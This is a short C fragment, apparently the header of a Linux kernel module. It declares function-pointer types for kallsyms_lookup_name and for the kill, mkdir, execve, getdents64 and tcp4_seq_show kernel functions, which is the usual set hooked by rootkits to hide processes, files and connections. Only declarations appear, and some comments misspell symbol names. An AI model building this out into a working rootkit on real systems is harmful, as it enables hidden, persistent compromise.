#include <linux/ftrace.h>
#include <linux/kprobes.h>
#include <linux/uaccess.h>
#include <linux/sched.h>
#include <linux/module.h>
#include <linux/kernel.h>

// kallsyms_lookup_name
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
// __64_sys_kill;
typedef asmlinkage long (*sys_kill_t)(struct pt_regs *regs);
// __64_sys_mkdir;
typedef asmlinkage long (*sys_mkdir_t)(struct pt_regs *regs);
// __64_sys_execve
typedef asmlinkage long (*sys_execve_t)(struct pt_regs *regs);
// tcp4_seq_show Function
typedef long (*tcp4_seq_show_t)(struct seq_file *seq, void *v);
// __64_sys_getdens64 
typedef asmlinkage long (*sys_getdents64_t)(struct pt_regs *regs);